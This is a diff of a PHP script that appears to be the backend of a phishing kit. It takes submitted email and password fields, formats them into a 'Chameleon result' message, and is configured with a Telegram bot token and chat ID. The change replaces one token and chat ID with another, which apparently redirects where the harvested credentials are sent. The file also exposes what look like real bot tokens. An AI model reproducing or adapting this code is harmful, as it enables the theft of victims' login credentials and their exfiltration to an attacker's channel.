@@ -59,8 +59,8 @@ if ((!empty(trim($_POST['email'])) && !empty(trim($_POST['password'])))) {
     $UserAgent = ParseUA();
     $email = $_POST['email'];
     $password = $_POST['password'];
-    $telegrambot = '6511565745:AAGXzEony7CkyaASBZiM9nFqVmqkci87VVE';
-    $telegramchatid =  6028066900;
+    $telegrambot = 'AAFZjdse6QkDxcH5VWhtOtkpCbk8a0NS1I0';
+    $telegramchatid =  8042802459;
 
     $message = "******* Chameleon result ******".PHP_EOL;
     $message .= "Email: {$email}".PHP_EOL;
@@ -85,3 +85,4 @@ if ((!empty(trim($_POST['email'])) && !empty(trim($_POST['password'])))) {
 }
 
 ?>
+
